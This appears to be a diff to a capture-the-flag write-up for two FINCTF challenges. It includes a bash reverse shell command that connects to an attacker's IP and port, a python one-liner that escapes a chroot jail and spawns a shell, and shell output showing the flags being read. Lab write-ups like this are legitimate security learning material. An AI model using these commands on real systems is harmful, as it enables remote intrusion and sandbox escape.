@@ -73,8 +73,99 @@ OSError: out of pty devices
 ```
 Oh ... 
 
-Available binary: `bash ls rm touch`
-I don't even remember how I did it...so i think it was a python reverse shell. Then you create a new `chroot` and linux can't handle 2 `chroot` at the same time
-So it lead to break out of it
+## Edit:
+I have been told that I was wrong and it was normal.. and they were right!
+Lets do it the good old-fasionned way
+```
+$(bash -i >& /dev/tcp/$IP/$PORT 0>&1)
+```
 
-If the instance get fixed I will update the solution
+There i go!
+```
+bash: cannot set terminal process group (92): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1# ls
+ls
+__pycache__
+app.py
+bin
+etc
+flag1
+get-pip.py
+lib
+lib64
+python
+root
+templates
+usr
+```
+Reading the flag with python
+```
+./python/bin/python -c "print(open('flag1').read())"
+```
+```
+bash-5.1# ./python/bin/python -c "print(open('flag1').read())"
+./python/bin/python -c "print(open('flag1').read())"
+FINCTF{Je-vous-4ssure-personne-ne-p3ut-obtenir-l3-seucrait!}
+```
+
+# Flag 2 : Get out of jail.. (in this case.. chroot)
+
+With python
+```
+if not os.path.exists("chroot"):
+    os.mkdir("chroot")
+os.chroot("chroot")
+```
+Getting myself cozy in a brand new jail
+
+Sending this payload https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/
+```python
+import os; os.chroot("chroot"); [os.chdir("..") for _ in range(10)]; os.chroot("."); os.system("/bin/sh");
+```
+
+Result:
+```
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+In root folder
+```
+cd /root
+ls
+app.py
+app.zip
+chroot
+create-env.sh
+flag1
+flag2
+index.html
+libnsl.so.2
+libnsl.so.2.0.1
+python.zip
+cat flag2
+FINCTF{n0o0o0o0-Nicéphore-va-devoir-travailler-très-tard}
+```
+
+Oink oink!
